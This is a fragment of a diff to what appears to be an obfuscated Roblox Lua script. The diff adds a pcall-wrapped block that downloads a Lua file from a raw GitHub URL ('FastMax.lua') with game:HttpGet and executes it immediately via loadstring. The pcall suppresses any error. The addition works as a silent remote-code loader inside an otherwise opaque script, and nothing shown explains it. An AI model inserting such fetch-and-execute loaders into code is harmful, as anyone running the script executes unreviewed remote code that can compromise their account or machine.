@@ -13,6 +13,10 @@ task.spawn(function()
         task.wait(3)
     end
 end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhDzaiScript/Setting/refs/heads/main/FastMax.lua"))()
+end)
 local L_1_ = {}
 L_1_[2] = table["concat"]
 do
